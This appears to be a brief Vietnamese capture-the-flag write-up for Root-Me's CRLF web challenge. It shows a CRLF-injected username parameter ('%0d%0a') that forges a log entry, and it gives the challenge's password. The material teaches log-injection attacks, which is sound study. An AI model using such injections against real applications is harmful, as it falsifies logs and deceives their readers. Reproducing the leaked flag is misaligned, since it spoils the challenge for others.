# [CRLF](https://www.root-me.org/en/Challenges/Web-Server/CRLF)

## Solutions

- Sử dụng burp suite để thay đổi request query parameter:
  - `username=guest+authenticated.%0d%0aa`
- Khi đó, log sẽ hiển thị thành:

```text
guest authenticated.
a failed to authenticate.
```

- Kèm theo đó là password: `rFSP&G0p&5uAg1%`

## References

- <https://securityboulevard.com/2022/05/crlf-injection-attack-explained-2/>
